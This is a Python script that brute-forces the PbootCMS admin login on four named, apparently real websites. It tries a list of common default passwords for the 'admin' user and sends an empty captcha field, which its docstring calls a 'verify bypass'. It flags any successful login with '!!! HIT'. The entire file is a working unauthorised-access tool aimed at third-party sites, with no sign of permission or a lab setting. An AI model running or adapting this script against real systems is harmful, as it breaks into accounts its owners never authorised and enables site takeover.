#!/usr/bin/env python3
"""PbootCMS login - correct fields (username/password/verify) + empty verify bypass"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
SITES = [("http://catugbio.com", "/admin/login.html"),
         ("http://bowlwithseoul.com", "/admin/login.html"),
         ("http://environmentalhelp.net", "/admin/login.html"),
         ("http://garagedoors-houstonheights.com", "/admin/login.html")]
PWS = ["admin", "admin123", "123456", "admin888", "pbootcms", "pboot", "12345678", "a123456", "admin666"]

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

for site, login_path in SITES:
    print("=== %s ===" % site, flush=True)
    op, cj = get_opener()
    code, final, body = fetch(op, site + login_path)
    # PbootCMS login POST to /admin.php?action=login (or same path)
    for pw in PWS:
        data = urllib.parse.urlencode({"username": "admin", "password": pw, "verify": ""})
        code, final, body = fetch(op, site + "/admin.php?action=login", data=data, referer=site + login_path)
        ok = "退出" in body or "logout" in body.lower() or "index/index" in final.lower() or "后台" in body and "首页" in body
        if ok:
            print("  !!! HIT admin/%s (%s)" % (pw, final[:50]), flush=True)
            break
        # check if response changed (login attempt processed)
        changed = len(body) > 100 and "login.html" not in final
        print("  admin/%s: code=%s final=%s size=%d" % (pw, code, final[:50], len(body)), flush=True)
